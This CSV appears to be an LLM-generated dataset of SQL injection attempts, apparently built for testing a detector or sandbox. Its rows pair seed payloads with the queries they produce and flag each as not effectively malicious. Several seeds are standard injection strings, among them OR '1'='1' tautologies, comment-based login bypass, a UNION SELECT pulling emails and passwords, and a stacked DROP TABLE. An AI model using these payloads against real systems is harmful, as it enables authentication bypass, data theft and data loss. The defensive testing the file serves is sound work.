id,seed_query,candidate_query,context,syntax_valid,sandbox_malicious,notes
99,/*SELECT*/+*+FRom+usErS+wHeRe+iD+/**/=/**/'a',SELECT * FROM users WHERE id = /*SELECT*/+*+FRom+usErS+wHeRe+iD+/**/=/**/'a',id_lookup,false,false,attack_category=encoding_obfuscation; source=llm_generated; generator_model=gemini-3-flash-preview; parse_failed; not_effectively_malicious
100,%27--,SELECT * FROM orders WHERE status = '%27--' ORDER BY date DESC,product_filter,true,false,attack_category=encoding_obfuscation; source=llm_generated; generator_model=gemini-3-flash-preview; payload_inside_quotes_only; not_effectively_malicious
101,%60;/**/,SELECT * FROM orders WHERE status = '%60;/**/' ORDER BY date DESC,product_filter,true,false,attack_category=encoding_obfuscation; source=llm_generated; generator_model=gemini-3-flash-preview; payload_inside_quotes_only; not_effectively_malicious
102,CHAR(39)%0A,SELECT * FROM orders WHERE status = 'CHAR(39)%0A' ORDER BY date DESC,product_filter,true,false,attack_category=encoding_obfuscation; source=llm_generated; generator_model=gemini-3-flash-preview; payload_inside_quotes_only; not_effectively_malicious
103,"%27+UNION+SELECT+NULL,+body+FROM+users--","INSERT INTO comments (user_id, body) VALUES (1, '%27+UNION+SELECT+NULL,+body+FROM+users--')",profile_update,true,false,attack_category=encoding_obfuscation; source=llm_generated; generator_model=gemini-3-flash-preview; payload_inside_quotes_only; not_effectively_malicious
104,"CHAR(45)-*UNION+SELECT+email,+password+FROM+admin/*","INSERT INTO comments (user_id, body) VALUES (1, 'CHAR(45)-*UNION+SELECT+email,+password+FROM+admin/*')",profile_update,true,false,attack_category=encoding_obfuscation; source=llm_generated; generator_model=gemini-3-flash-preview; payload_inside_quotes_only; not_effectively_malicious
105,SELECT * FROM users WHERE username = '' OR '1'='1',SELECT * FROM users WHERE username = 'SELECT * FROM users WHERE username = '' OR '1'='1'' AND password = 'anything',login,false,false,attack_category=nested_injection; source=llm_generated; generator_model=gemini-3-flash-preview; payload_inside_quotes_only; parse_failed; not_effectively_malicious
106,SELECT * FROM users WHERE username = 'admin' --' AND password = 'anything',SELECT * FROM users WHERE username = 'SELECT * FROM users WHERE username = 'admin' --' AND password = 'anything'' AND password = 'anything',login,false,false,attack_category=nested_injection; source=llm_generated; generator_model=gemini-3-flash-preview; payload_inside_quotes_only; parse_failed; not_effectively_malicious
107,"SELECT * FROM users WHERE username IN ('admin', (SELECT 'x'))","SELECT * FROM users WHERE username = 'SELECT * FROM users WHERE username IN ('admin', (SELECT 'x'))' AND password = 'anything'",login,false,false,attack_category=nested_injection; source=llm_generated; generator_model=gemini-3-flash-preview; payload_inside_quotes_only; parse_failed; not_effectively_malicious
108,;select * from users where username like '%' --,SELECT * FROM products WHERE name LIKE '%;select * from users where username like '%' --%',search,true,false,attack_category=nested_injection; source=llm_generated; generator_model=gemini-3-flash-preview; payload_inside_quotes_only; not_effectively_malicious
109,' OR EXISTS(SELECT 1 FROM orders),SELECT * FROM products WHERE name LIKE '%' OR EXISTS(SELECT 1 FROM orders)%',search,false,false,attack_category=nested_injection; source=llm_generated; generator_model=gemini-3-flash-preview; payload_inside_quotes_only; parse_failed; not_effectively_malicious
110,'; DROP TABLE IF EXISTS backups;--,SELECT * FROM products WHERE name LIKE '%'; DROP TABLE IF EXISTS backups;--%',search,true,false,attack_category=nested_injection; source=llm_generated; generator_model=gemini-3-flash-preview; payload_inside_quotes_only; not_effectively_malicious
111,(SELECT 1 FROM (SELECT CASE WHEN id=1 THEN 1 ELSE 0 END AS x FROM users)),SELECT * FROM users WHERE id = (SELECT 1 FROM (SELECT CASE WHEN id=1 THEN 1 ELSE 0 END AS x FROM users)),id_lookup,true,false,attack_category=nested_injection; source=llm_generated; generator_model=gemini-3-flash-preview; not_effectively_malicious
112,1 AND (SELECT COUNT(*) FROM users WHERE id=2),SELECT * FROM users WHERE id = 1 AND (SELECT COUNT(*) FROM users WHERE id=2),id_lookup,true,false,attack_category=nested_injection; source=llm_generated; generator_model=gemini-3-flash-preview; not_effectively_malicious
113,-- OR 'a'='a'; SELECT * FROM users WHERE id=(SELECT MAX(id) FROM users),SELECT * FROM users WHERE id = -- OR 'a'='a'; SELECT * FROM users WHERE id=(SELECT MAX(id) FROM users),id_lookup,false,false,attack_category=nested_injection; source=llm_generated; generator_model=gemini-3-flash-preview; parse_failed; not_effectively_malicious
114,(SELECT status FROM users WHERE username = 'admin' AND password = 'password'),SELECT * FROM orders WHERE status = '(SELECT status FROM users WHERE username = 'admin' AND password = 'password')' ORDER BY date DESC,product_filter,false,false,attack_category=nested_injection; source=llm_generated; generator_model=gemini-3-flash-preview; payload_inside_quotes_only; parse_failed; not_effectively_malicious
115,/* OR (SELECT 1 FROM users WHERE username = 'admin'-- */),SELECT * FROM orders WHERE status = '/* OR (SELECT 1 FROM users WHERE username = 'admin'-- */)' ORDER BY date DESC,product_filter,false,false,attack_category=nested_injection; source=llm_generated; generator_model=gemini-3-flash-preview; payload_inside_quotes_only; parse_failed; not_effectively_malicious
116,OR (SELECT * FROM (SELECT * FROM users WHERE username = 'admin') AS temp),SELECT * FROM orders WHERE status = 'OR (SELECT * FROM (SELECT * FROM users WHERE username = 'admin') AS temp)' ORDER BY date DESC,product_filter,false,false,attack_category=nested_injection; source=llm_generated; generator_model=gemini-3-flash-preview; payload_inside_quotes_only; parse_failed; not_effectively_malicious
117,(SELECT body FROM comments WHERE user_id=1)--,"INSERT INTO comments (user_id, body) VALUES (1, '(SELECT body FROM comments WHERE user_id=1)--')",profile_update,true,false,attack_category=nested_injection; source=llm_generated; generator_model=gemini-3-flash-preview; payload_inside_quotes_only; not_effectively_malicious
118,--(SELECT body FROM comments WHERE user_id=1) --,"INSERT INTO comments (user_id, body) VALUES (1, '--(SELECT body FROM comments WHERE user_id=1) --')",profile_update,true,false,attack_category=nested_injection; source=llm_generated; generator_model=gemini-3-flash-preview; payload_inside_quotes_only; not_effectively_malicious
119,;--(SELECT body FROM comments WHERE user_id=1);--,"INSERT INTO comments (user_id, body) VALUES (1, ';--(SELECT body FROM comments WHERE user_id=1);--')",profile_update,true,false,attack_category=nested_injection; source=llm_generated; generator_model=gemini-3-flash-preview; payload_inside_quotes_only; not_effectively_malicious
